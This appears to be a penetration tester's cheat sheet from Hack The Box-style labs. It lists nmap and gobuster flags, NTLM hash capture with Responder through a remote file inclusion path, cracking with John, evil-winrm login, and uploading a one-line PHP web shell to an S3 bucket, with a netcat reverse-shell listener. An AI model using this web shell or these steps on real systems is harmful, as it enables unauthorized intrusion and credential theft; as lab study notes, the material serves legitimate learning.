#nmap

```shell
-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.

-sV: Enables version detection, which will detect what versions are running on what
port.h

-p- : This flag scans for all TCP ports ranging from 0-65535

--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher
```

#gobuster

```shell
dir : Uses directory/file enumeration mode.
vhosts : Uses VHOST for brute-forcing.

--url : The target URL.
--wordlist : Path to the wordlist.
-x : File extension(s) to search for. (php/html)
```

# Responder:
```shell
sudo responder -I {network_interface} 
http://unika.htb/?page=//10.10.14.25/somefile
```

# John the riper:
```shell
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

#evil-winrm
```shell
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

#AWS
```shell
$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
                                                                                                            
$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2022-08-14 13:08:27 thetoppers.htb

$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-08-14 13:08:27          0 .htaccess
2022-08-14 13:08:27      11952 index.php

$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php              
                                                                                                            
```

# PHP
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
http://thetoppers.htb/shell.php?cmd=id
```

#REVERSE SHELL
start ncat listener on our local port:
```shell
nc -nvlp 1337
```

# Acronyms

WinRM, is a Windows-native built-in remote management protocol. port: 5985
NTLM: New Technology LAN Manager
LFI: Local File inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php 
RFI: Remote File Inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php

S3: is a cloud-based object storage service. It allows us to store things in containers called buckets.
AWS S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery,
Static Website etc. The files stored in the Amazon S3 bucket are called S3 objects.